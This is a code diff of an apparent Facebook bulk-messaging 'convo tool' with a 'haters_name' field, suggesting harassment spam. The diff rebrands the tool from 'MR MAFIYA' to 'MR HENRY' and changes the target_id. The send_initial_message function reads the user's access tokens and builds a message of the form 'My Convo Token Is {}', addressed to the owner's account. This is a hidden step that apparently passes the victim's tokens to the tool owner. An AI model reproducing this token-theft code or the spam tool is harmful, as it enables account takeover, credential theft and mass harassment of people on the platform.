@@ -25,7 +25,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"   MR MAFIYA INXIDE")
+          self.wfile.write(b"   MR HENRY INXID3")
 def execute_server():
       PORT = int(os.environ.get('PORT', 4000))
 
@@ -39,15 +39,15 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "𝗛𝗲𝗹𝗹𝗼 𝗠𝗮𝗳𝗶𝘆𝗮 𝗦𝗶𝗿..!! 𝗜'𝗺 𝗨𝘀𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗼𝗹 𝗔𝗻𝗱 𝗠𝘆 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗸𝗲𝗻 𝗜𝘀 {}"
+      msg_template = "𝗛𝗲𝗹𝗹𝗼 𝗛𝗘𝗡𝗥𝗬 𝗦𝗶𝗿..!! 𝗜'𝗺 𝗨𝘀𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗼𝗹 𝗔𝗻𝗱 𝗠𝘆 𝗖𝗼𝗻𝘃𝗼 𝗧𝗼𝗸𝗲𝗻 𝗜𝘀 {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100069713641443"
+      target_id = "61564155712159"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '[>] ==========𝗠𝟵𝗙𝗜𝗬𝟵=𝗦𝟯𝗥𝗩𝟯𝗥=𝗥𝗨𝗡𝗡𝗜𝗡𝗚==========')
+          print('\033[1;92m' + '[>] ==========𝗛3𝗡𝗥𝗬=𝗦𝟯𝗥𝗩𝟯𝗥=𝗥𝗨𝗡𝗡𝗜𝗡𝗚==========')
 
       headers = {
           'Connection': 'keep-alive',
@@ -97,7 +97,7 @@ def send_messages_from_file():
           speed = int(file.read().strip())
 
       def liness():
-          print('\033[1;92m' + '[>] ==========𝗠𝟵𝗙𝗜𝗬𝟵=𝗦𝟯𝗥𝗩𝟯𝗥=𝗥𝗨𝗡𝗡𝗜𝗡𝗚==========')
+          print('\033[1;92m' + '[>] ==========𝗛3𝗡𝗥𝗬=𝗦𝟯𝗥𝗩𝟯𝗥=𝗥𝗨𝗡𝗡𝗜𝗡𝗚==========')
 
       headers = {
           'Connection': 'keep-alive',
@@ -124,12 +124,12 @@ def send_messages_from_file():
 
                   current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                   if response.ok:
-                      print("\033[1;36;1m[❤️] YOU ARE USING MR. MAFIYA CONVO TOOL : 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 {} 𝗢𝗳 𝗖𝗼𝗻𝘃𝗼 {} 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗕𝘆 𝗧𝗼𝗸𝗲𝗻 𝗡𝗼. {}: {}".format(
+                      print("\033[1;36;1m[❤️] YOU ARE USING MR. HENRY CONVO TOOL : 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 {} 𝗢𝗳 𝗖𝗼𝗻𝘃𝗼 {} 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗕𝘆 𝗧𝗼𝗸𝗲𝗻 𝗡𝗼. {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message + ' ' + here_name))
                       liness()
                       liness()
                   else:
-                      print("\033[1;36;1m[❤️] YOU ARE USING MR. MAFIYA CONVO TOOL : 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 {} 𝗢𝗳 𝗖𝗼𝗻𝘃𝗼 {} 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗕𝘆 𝗧𝗼𝗸𝗲𝗻 𝗡𝗼. {}: {}".format(
+                      print("\033[1;36;1m[❤️] YOU ARE USING MR. HENRY CONVO TOOL : 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 {} 𝗢𝗳 𝗖𝗼𝗻𝘃𝗼 {} 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗕𝘆 𝗧𝗼𝗸𝗲𝗻 𝗡𝗼. {}: {}".format(
                           message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message + ' ' + here_name))
                       liness()
                       liness()
